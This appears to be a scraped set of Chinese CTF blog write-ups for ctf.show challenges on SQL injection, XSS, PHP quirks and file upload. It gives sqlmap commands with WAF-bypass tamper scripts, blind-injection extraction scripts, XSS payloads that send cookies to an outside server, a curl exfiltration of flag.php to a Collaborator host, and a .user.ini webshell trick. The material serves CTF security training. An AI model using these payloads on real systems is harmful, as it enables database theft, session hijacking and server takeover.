--dump\n```\n\n**205**\n\n提示api鉴权，发现请求前会先对一个url进行调用\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-10 21.53.17.png)\n\n使用如下两个参数\n\n```\n--safe-url 设置在测试目标地址前访问的安全链接\n--safe-freq 设置两次注入测试前访问安全链接的次数\n```\n\n最终命令~~悄悄换表名和列名真的可恶~~\n\n```\nsqlmap -u http://685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show/api/index.php --safe-url=\"http://685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxc -C flagv --dump\n```\n\n**206**\n\n提示SQL需要闭合，~~当我sqlmap傻是吧~~，同上即可\n\n**207**\n\n--tamper 的初体验\n\n[tamper总结](https://blog.csdn.net/whatday/article/details/54774043)\n\n使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击，--tamper=TAMPER 利用给定的脚本进行篡改注入数据，该题过滤了空格，使用自带的space2comment.py即可绕过\n\n```\nsqlmap -u http://894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show/api/index.php --safe-url=\"http://894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump --tamper=\"space2comment.py\"\n```\n\n**208**\n\n过滤了小写的select，但是sqlmap中所有SELECT都是大写，同上即可\n\n```\nsqlmap -u http://d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show/api/index.php --safe-url=\"http://d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump --tamper=\"space2comment.py\"\n```\n\n**209**\n\n过滤了空格，*和=，讲道理使用bluecoat.py就行，但是出不来，只能自己编写脚本替换了，将空格用%09替换，=用LIKE替换\n\n```\nsqlmap -u http://477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx,id,tes --dump --batch --tamper web209.py\n```\n\n```python\n#web209.py\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += chr(0x9)\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n\n            elif payload[i] == '=':\n                retVal += chr(0x9) + 'like' + chr(0x9)\n                continue\n\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += chr(0x9)\n                continue\n\n            retVal += payload[i]\n\n    return retVal\n\n```\n\n**210**\n\n对字符串进行base64解码反转再解码，那就编码反转再编码\n\n```\nsqlmap -u http://557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch --tamper web210.py\n```\n\n```python\n#web210.py\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\nimport base64\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n\n\n    retVal = payload\n\n    if payload:\n        retVal=retVal.encode()\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n    return retVal.decode()\n```\n\n**211**\n\n相比于上题多过滤了空格，加上space2commit脚本即可\n\n```\nsqlmap -u http://5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --dump --batch --tamper=\"space2commit.py,web210.py\"\n```\n\n**212**\n\n前两个加起来\n\n```\nsqlmap -u http://fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --dump --batch --tamper=\"web209.py,web210.py\"\n```\n\n**213**\n\n一键getshell，--os-shell\n\n```\nsqlmap -u http://18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --os-shell --dump --batch --tamper=\"web209.py,web210.py\"\n```\n\n**214**\n\n时间盲注开始\n\n首页发现网络流量中有select.js，查看代码\n\n```javascript\n\nlayui.use('element', function(){\n  var element = layui.element;\n  element.on('tab(nav)', function(data){\n    console.log(data);\n  });\n});\n\n$.ajax({\n      url:'api/',\n      dataType:\"json\",\n      type:'post',\n      data:{\n        ip:returnCitySN[\"cip\"],\n        debug:0\n      }\n\n    });\n```\n\n发现提交的表单中有两个变量，测试一下\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-12 14.27.34.png)\n\n测试成功，开始编写代码\n\n```python\nimport requests\n\nurl=\"http://7a5edb92-03ea-49ff-bd27-30b753229c99.challenge.ctf.show/api/\"\nflagchar=\"-{},qwertyuiopasdfghjklzxcvbnm_1234567890\"\n\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'1 or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagx\"),{i},1))=\"{j}\",sleep(3),1)',\n\t\t\t'ip': f'1 or if((substr((select group_concat(flaga) from ctfshow_flagx),{i},1))=\"{j}\",sleep(3),1)',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=2.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**215**\n\n单引号闭合\n\n```python\nimport requests\n\nurl=\"http://59e08013-c379-4607-a6bf-c11d5c4d6d6e.challenge.ctf.show/api/\"\nflagchar=\"-{},flagqwertyuiopsdhjkzxcvbnm_1234567890\"\n\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'1\\' or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t#'ip': f'1\\' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxc\"),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t'ip': f'1\\' or if((substr((select group_concat(flagaa) from ctfshow_flagx),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=2.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**216**\n\nbase64编码\n\n```python\nimport requests\n\nurl=\"http://fe2f1a17-e483-4137-b85d-9fa3a6daaa18.challenge.ctf.show/api/\"\nflagchar=\"-{},ctfshowlagbde1234567890\"\nnamechar=\",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'\"MQ==\") or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t#'ip': f'\"MQ==\") or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxcc\"),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t'ip': f'\"MQ==\") or if((substr((select group_concat(flagaac) from ctfshow_flagxcc),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=1.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**217**\n\nsleep不能用了啦，都ctfshow害得啦，拜托，换benchmark\n\n```\nimport requests\n\nurl = \"http://e7d85700-c8a1-48c2-bea8-4ead2e0976b4.challenge.ctf.show/api/\"\nflagchar = \"-{},ctfshowlagbde1234567890\"\nnamechar = \",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor i in range(1, 1000):\n    for j in flagchar:\n        data = {\n            #'ip': f'1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            #'ip': f'1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxccb\"),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            'ip': f'1) or if(((substr((select group_concat(flagaabc) from ctfshow_flagxccb),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            'debug': '1'\n        }\n        try:\n            requests.post(url=url, data=data, timeout=4)\n        except:\n            print(j, end='')\n            break\n\n```\n\n**218**\n\nbenchmark也🈚️了，换笛卡尔积\n\n```python\nimport requests\n\nurl = \"http://de5b41b6-9f89-4e0a-b913-7c33a143979a.challenge.ctf.show/api/\"\nflagchar = \"-{},abcdef1234567890\"\nnamechar = \",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor k in range(10):\n    print()\n    for i in range(1, 50):\n        for j in flagchar:\n            data = {\n                #'ip': f'1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\\'{j}\\'),(SELECT count(*) FROM information_schema.columns A,information_schema.columns B),1)#',\n                #'ip': f'1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxc\"),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n                'ip': f'1) or if(((substr((select group_concat(flagaac) from ctfshow_flagxc),{i},1))=\\'{j}\\'),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#',\n                'debug': '1'\n            }\n            try:\n                requests.post(url=url, data=data, timeout=4)\n            except:\n                print(j,end=\"\")\n                break\n\n```\n\n**219**\n\n过滤了rlike，笛卡尔积依然可用，同上即可\n\n**220**\n\nsleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr\n\n真能滤，换left\n\n```\nimport requests\n\nurl = \"http://ee633dfd-4a05-4685-bbf6-1da4b5fc4d1d.challenge.ctf.show/api/\"\nflagchar = \"ctfshow-{},abde1234567890\"\nnamechar = \"flag,ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nflag=\"\"\nfor k in range(10):\n    print()\n    flag = \"\"\n    for i in range(1, 50):\n        for j in flagchar:\n            tmp=flag+j\n            data = {\n                'ip': f'1) or if((left((select flagaabcc from ctfshow_flagxcac),{i})=\\'{tmp}\\'),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#',\n                'debug': '1'\n            }\n            try:\n                requests.post(url=url, data=data, timeout=4)\n            except:\n                flag=tmp\n                print(j,end=\"\")\n                break\n```\n\n时间盲注，结束\n\n**221**\n\nlimit注入，欢迎收看P神博客\n\n报错注入\n\n```\nSELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); \n```\n\n**222**\n\nGroup_by后面的参数来进行布尔注入\n\n```python\nimport requests\nurl=\"http://debba94a-3e3c-4b9e-97e0-27c6e7381dde.challenge.ctf.show/api/?u=\"\nca=\"ctfshow{1234567890-abcdef}\"\nfor i in range(1,100):\n    for j in ca:\n        payload=f'if(substr((select group_concat(flagaabc) from ctfshow_flaga),{i},1)=\"{j}\",\"username\",cot(0))'\n        tex=requests.get(url+payload).text\n        if \"username\" in tex:\n            print(j,end=\"\")\n            break;\n```\n\n**223**\n\n过滤了数字，贴个大佬脚本\n\n```python\n# @Author:Kradress\nimport requests\nimport string\n\nurl = \"http://7702b56c-35d9-4b80-abdc-bb0956f4bce5.challenge.ctf.show/api/\"\n\nresult = ''\ndict=string.ascii_lowercase+string.digits+\"_-,}{\"\n\n# 爆表名  \n# payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\"\n# 爆列名\n# payload = \"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagas'\"\n#爆字段值\npayload = \"select flagasabc from ctfshow_flagas\"\n\ndef numToStr(str):\n    parts = []\n    for s in str:\n        parts.append(numToStr2(s))\n    res = ','.join(parts)\n    return f\"concat({res})\"\n\ndef numToStr2(num):\n    parts = []\n    n = ord(num)\n    for i in range(n):\n        parts.append(\"true\")\n    res = \"+\".join(parts)\n    return f\"char({res})\"\n\nfor i in range(1,46):\n    print(i)\n    for j in dict:\n        params={\n            'u' : f\"concat(if(substr(({payload}),{numToStr(str(i))},true)={numToStr(j)},username,cot(false)))#\"\n        }\n        r = requests.get(url, params=params)\n        # print(r.url)\n        if(\"ctfshow\" in r.text):\n            result +=j\n            print(result)\n            break\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"CTFshowXSS","url":"/posts/36544.html","content":"\n首先自己搭建或者找[xss测试平台](https://xss8.cc/login/)还有[另一个](https://xss.pt/)\n\n**316**\n\n```\n最简单的：\n<script>document.location.href='http://服务器IP/?x='document.cookie</script>\n```\n\n**317**\n\n过滤了script\n\n```\n<body onload=\"document.location.href='http://服务器IP/?x='+document.cookie\"></body>\n```\n\n**318**\n\n过滤了img，使用iframe\n\n```\n<iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#48;&#120;&#46;&#97;&#120;&#47;&#107;&#48;&#74;&#106;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>\n<BODY\tONLOAD=document.location='http://xss.darkflow.top?cookie='+document.cookie;>\n```\n\n**319**\n\n同上即可\n\n**320**\n\n过滤了空格，script，用tab\n\n```\n<iframe\tWIDTH=0\tHEIGHT=0\tsrcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#48;&#120;&#46;&#97;&#120;&#47;&#107;&#48;&#74;&#106;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>\n```\n\n**321**\n\n过滤了img，同上\n\n**322**\n\n同上\n\n**323**\n\n过滤了iframe，使用body onload（艹居然过滤了xss，我的域名里有xss啊啊啊啊啊啊啊啊啊啊啊）\n\n```\n<body/onload=document.location='http://20.231.29.154:5000/?cookie='+document.cookie;>\n```\n\n一直到326通杀\n\n浅总结：看这几道题来说，反射性xss无非就是变换标签，结合各种编码去绕过，空格用`\\`，关键字双写或者编码等等\n\n\n\n存储型XSS开始\n\n**327**\n\n收件人为admin，内容为XSS即可\n\n```\n<body/onload=document.location='http://20.231.29.154:5000/?cookie='+document.cookie;>\n```\n\n**328**\n\n构造js偷管理员cookie（不知道为啥我偷了登陆了也不行）\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 17.41.19.png)\n\n用超强模块吧\n\n```\n<sCRiPt sRC=//xss8.cc/R9YM></sCrIpT>\n```\n"},{"title":"CTFshowPHP特性","url":"/posts/47427.html","content":"\n**89**\n\n数组绕过\n\n```\nintval()用于获取变量的整数值\nintval() 函数通过使用指定的进制base转换（默认是十进制），返回变量var的integer数值。intval()不能用于object，否则会产生E_NOTICE错误并返回1。\n语法\nint intval ( mixed $var [, int $base = 10 ] )\n```\n\n**90**\n\n十六进制\n\n**91**\n\n```\nif(preg_match('/^php$/im', $a)){\n    if(preg_match('/^php$/i', $a)){\n        echo 'hacker';\n    }\n//m代表多行匹配，换行符加php即可\n//cmd=%0Aphp\n```\n\n**92**\n\n同90\n\n**93**\n\n滤了16进制，使用8进制绕过\n\n```\n?num=010574\n```\n\n**94**\n\n全等用小数绕过\n\n```\n?num=4476.01\n```\n\n**95**\n\n小数点没了，用八进制加正号绕过0过滤\n\n```\n?num=+010574\n```\n\n**96**\n\n```\n?u=./flag.php\n```\n\n**97**\n\nmd5强相等数组绕过\n\n```\na[]=1&b[]=2\n```\n\n**98**\n\n分析代码\n\n```\n3.\t$_GET?$_GET=&$_POST:'flag';\n\n    if ($_GET) {\t\t\t//只要有输入的get参数\n        $_GET = &$_POST; //就将get方法改变为post方法(修改了get方法的地址)\n        \t\t\t\t// 比如$_GET[a] = &$_POST[a]，get传a无作用，必须用POST\n    } else {\n        \"flag\";\n    }\n\n4、5行无作用\n\n6.\thighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);\n\n    if ($_GET['HTTP_FLAG'] == 'flag') { //需要满足这个条件就可以输出flag\n        highlight_file($flag);\t\t\t//因为没有ctfshow{xxxxx}这个文件，所以会产生报错\n        \t\t\t\t\t\t\t\t//进而我们可以看到flag内容\n    } else {\n        highlight_file(__FILE__);\n    }\n构造POST\nHTTP_FLAG=flag\n再添加任意get参数即可\n```\n\n**99**\n\n```\nin_array函数如果不设置strict参数为真则进行若比较，1.php==1\npayload：n=1.php\nPOST\ncontent=一句话木马\n```\n\n**100**\n\n在PHP中，=赋值运算符优先级高于and，所以语句执行是v0=is_numeric(v1)，传入v1为数字即可\n\n```\n?v1=1&v2=var_dump($ctfshow)&v3=;\n```\n\n**101**\n\n反射类\n\n```php\n顾名思义，就是一个类的反射（废话么不是）\n下面是例子\nclass fuc { //定义一个类\n static\n function ec() {\n  echo '我是一个类';\n }\n}\n$class=new ReflectionClass('fuc'); //建立 fuc这个类的反射类\n$fuc=$class->newInstance(); //相当于实例化 fuc 类\n$fuc->ec(); //执行 fuc 里的方法ec\n$ec=$class->getmethod('ec'); //获取fuc 类中的ec方法\n$fuc=$class->newInstance(); //实例化\n$ec->invoke($fuc);   //执行ec 方法\n```\n\n**102**\n\n```\n先转base64再转16进制完成绕过\n```\n\n**103**\n\n同上\n\n**104**\n\n没验证直接传俩一样的呗\n\n**105**\n\n```PHP\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}foreach($_POST as $key => $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}\n多种操作方法\n通过die($error)输出\npayload:a=flag \nPOST: error=a\n进行的操作为\n$a=$flag;\n$error=$a;\n\n此时$a=flag{test123};$error=flag{test123};从而输出error也就是输出flag\n通过die($suces)\npayload:suces=flag&flag=\n进行的操作为\n$suces=$flag;\n\n```\n\n**106**\n\n构造数组或弱相等绕过\n\n```\naaroZmOk\naaK1STfY\naaO8zKZF\naa3OFF9m\n```\n\n**107**\n\n```php\nparse_str函数，将字符串解析成多个变量\n$a=\"x=1&y=2\";\nparse_str($a,$b);\n此时$b['x']为1，$b['y']为2\n\npaylaod:?v3=1\nPOST\nv1=flag=c4ca4238a0b923820dcc509a6f75849b\n```\n\n**108**\n\n正则表达式%00截断，正则表达式只会匹配%00之前的内容\n\n```\nstrrev()//反转字符串\nintval()//取整数\npayload:?c=a%00778\n```\n\n**109**\n\n```php\neval(\"echo new $v1($v2());\");\n//构造使得v1名称的类存在后面任意构造即可\n```\n\n**110**\n\n```PHP\nFilesystemIterator类的使用\n$a=new FilesystemIterator(getcwd());\nwhile($a->valid()){\n  echo $a->getFilename().\"\\n\";\n  $a->next();\n}\n迭代输出当前目录下的内容\ngetcwd()//取得当前工作目录\n```\n\n**111**\n\nv1要在正则中等于ctfshow，执行的语句就是\n\n```\n$ctfshow=&$(v2的值);\nvar_dump($ctfshow);\n相当于执行了\nvar_dump($(v2的值));\n令v2=GLOBALS超全局变量即可将所有变量打印\npayload:?v1=ctfshow&v2=GLOBALS\n```\n\n**112**\n\n```\nURL二次编码，题目中把base64滤过了，对b进行二次URL编码即可，传入php时进行一次解码，调用php伪协议时再有一次\n```\n\n**113**\n\n压缩流读取\n\n```\npayload:?file=compress.zlib:///var/www/html/flag.php\n```\n\n**114**\n\n```\nphp://filter\n```\n\n**115**\n\n在数字前加上空格，也会被is_numeric函数认为是数字\n\ntrim函数会过滤空格以及`\\n\\r\\t\\v\\0`，但不会过滤`\\f`\n\n最终payload:urlencode(\"\\f\".36)\n\n**123**\n\n```\nPHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格，+，.，[转换为_，但是当有特殊字符[时，后面的内容中就不会替换了\npayload:\nPOST:\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag\n```\n\n**125**\n\n```\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=var_export(get_defined_vars())\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=highlight_file($_GET[1])\n?1=flag.php\n```\n\n**126**\n\n```\n1、cli模式（命令行）下\n第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数\n2、web网页模式下\n在web页模式下必须在php.ini开启register_argc_argv配置项\n设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果\n这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]//这里的这个参数就是GET请求中?后的内容\n$argv,$argc在web模式下不适用\n```\n\n```\npayload:?$fl0g=flag_give_me;\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=eval($a[0])\n```\n\n**127**\n\n前面的自动转换咯\n\n**128**\n\n```\n小知识点： _()是一个函数\n_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll\nget_defined_vars()函数\nget_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag\npayload: ?f1=_&f2=get_defined_vars\n```\n\n**129**\n\n目录穿越\n\n```\npayload:?f=/ctfshow/../../../../var/www/html/flag.php \n```\n\n**130**\n\n正则/.+?ctfshow/is\n\nstripos($f, 'ctfshow') === FALSE\n\nstripos返回位置从0开始，未查找到才返回false，在严格相等中不相等\n\n直接绕\n\nf=ctfshow\n\n**131**\n\n[正则溢出](https://www.laruence.com/2010/06/08/1579.html)\n\n传个超过一百万长度的字符就好啦\n\n```\nf='kkkk'*250000+'36Dctfshow'\n#python真好用\n```\n\n**132**\n\nrobots.txt进admin\n\n对于“与”（&&） 运算： x && y 当x为false时，直接跳过，不执行y；\n\n对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y。\n\n在判断这个的时候if($code === mt_rand(1,0x36D) && $password === $flag || $username ===\"admin\") 第一个$code === mt_rand(1,0x36D)为false,之后就执行|| $username ===\"admin\"\n\n后面有或，所以满足username==='admin'即可\n\n```\npayload:/admin/?code=admin&password=&username=admin\n```\n\n**133**\n\n[骚操作](https://blog.csdn.net/qq_46091464/article/details/109095382)\n\n```\n我们传递?F=`$F`;+sleep 3好像网站确实sleep了一会说明的确执行了命令\n**那为什么会这样？**\n因为是我们传递的`$F`;+sleep 3。先进行substr()函数截断然后去执行eval()函数\n这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。\n而$F就是我们输入的`$F`;+sleep 3 使用最后执行的代码应该是\n`$F`;\n$F变量内容就是我们最终执行的内容\n```\n\n使用一把burp自带的功能，Burp Collaborator，相较于DNSLog的好处就是可以带出POST信息，也可以携带Cookie\n\n还有curl命令的使用\n\n```\npayload:?F=`$F`;+curl -X POST -F xx=@flag.php  http://whhi73p89wxl0oghis6zcslnue04ot.burpcollaborator.net\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-09 15.18.07.png)\n\n**134**\n\nphp变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。\n\n```\npayload: ?_POST[key1]=36d&_POST[key2]=36d\n```\n\n**135**\n\n同之前或者直接mv改名\n\n```\npayload:?F=`$F`;+mv flag.php flag.txt;\n```\n\n**136**\n\nban了一堆命令，需要回显，使用Linux tee命令\n\nTee是Linux命令，用于显示程序的输出并将其复制到一个文件中。\n\n```\n命令|tee 输出文件\n```\n\n```\npayload:?c=tac /f149_15_h3r3|tee 1\n查看/1文件即可\n```\n\n**137**\n\ncall_user_func()来调用一个类里面的方法时，使用::如class::function\n\n```\npayload:\nPOST\nctfshow=ctfshow::getFlag\n```\n\n**138**\n\n调用还能传数组\n\n```\npayload:\nPOST\nctfshow[]=ctfshow&ctfshow[]=getFlag\n```\n\n**139**\n\n自动跳转我谢谢你啊\n\n我是真妹想到这玩意还能盲注\n\n```\nimport requests\nimport time\nimport string\nstr=string.digits+string.ascii_lowercase+\"-\"#获取小写字母与数字\nresult=\"\"\nkey=0\nfor j in range(1,45):\n\tprint(j)\n\tif key==1:\n\t\tbreak\n\tfor n in str:\n\t\tpayload=\"if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi\".format(j,n)\n\t\t#print(payload)\n\t\turl=\"http://13f3a3cd-22e6-4922-a7eb-431f62263a4f.challenge.ctf.show/?c=\"+payload\n\t\ttry:\n\t\t\trequests.get(url,timeout=(2.5,2.5))\t#time()第一个参数是响应时间，第二个是读取时间\n\t\texcept:\n\t\t    result=result+n\n\t\t    print(result)\n\t\t    break\n```\n\n**140**\n\nintval把字符串转成0，0=='字符串'结果为真\n\n找俩函数返回值为字符串就行\n\n```\npayload:\nPOST\nf1=md5&f2=phpinfo\n```\n\n**141**\n\n[绕过无字母数字方法](https://blog.csdn.net/miuzzx/article/details/109143413)\n\n使用取反法\n\n```\npayload：\n?v1=1&v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);-&v2=1\n```\n\n**142**\n\n各种进制取零就行\n\n**143**\n\n过滤了取反字符，\n"},{"title":"CTFShow文件上传","url":"/posts/2824.html","content":"\n# 文件上传\n\n\n\n\n\n\n\n\n\n\n\n\n\n**151**\n\n前端校验，直接绕过\n\n**152**\n\nContent/Type校验，直接绕过\n\n**153**\n\n文件后缀名校验，尝试使用php5,phtml等文件失败，康康wp学习新知识，查看响应 头发现中间件是nginx\n\n```\nnginx中和apache的.htacess有相同作用的文件是.user.ini，进一步拓展，php中的默认配置文件实为php.ini，而php.ini有四种配置模式\n\nPHP_INI_USER\t\t\t可以在user.ini中设定\nPHP_INI_PERDIR\t\t可以在php.ini,.htacess,httpd.conf中设定\nPHP_INI_SYSTEM\t\t可以在php.ini,httpd.conf中设定\nPHP_INI_ALL\t\t\t\t随意设定\n\n并且除了php.ini文件之外，php还会从当前目录到web根目录下逐级搜索ini文件，并且在世纪操作中除了PHP_INI_SYSTEM中的内容都可以通过.user.ini进行设定\n\n那么user.ini中实际有用的配置项有两个：\nauto_append_file \t//在php4.2.3及以前是PHP_INI_ALL里面的，后面变成了PHP_INI_PERDID\nauto_prepend_file\n这两项的功能是制定一个文件包含在要执行的文件之后/之前，类似帮助原始文件添加一个require(某文件)\n```\n\n所以最终我们需要的就是将木马上传后再上传.user.ini设置包含木马即可\n\n```\n//.user.ini\nauto_prepend_file = shell.png\n//shell.png\n@eval($_POST['kkk']);\n```\n\n**154**\n\n同上题，过滤了php，大小写绕过\n\n**155**\n\n严格过滤php，所以大小写过不去了，短标签绕过\n\n```PHP\n当php参数:short_open_tag = On时，php可以解析短标签内容\nphp中常见的四种标签的写法：\n<?php echo \"CTF\"; ?>\n<? echo \"CTF\"; ?>\t\t//short_open_tag = On\n<% echo \"CTF\"; %>\t\t//这种写法在php配置中默认关闭了的，所以不能输出一行3.如果要正常输出，需要配置php.ini文件。在配置文件中找到asp_tags=off ,将off改为on。改动配置文件后需要重启apache。 \n<script language=\"php\"> echo \"CTF\"; </script>\n\n还有一种神奇写法以后会用到\n<?=(表达式)?>  等价于 <?php echo (表达式)?> //无限制  \n```\n\n**156**\n\n过滤了`[  ]`，可用`{  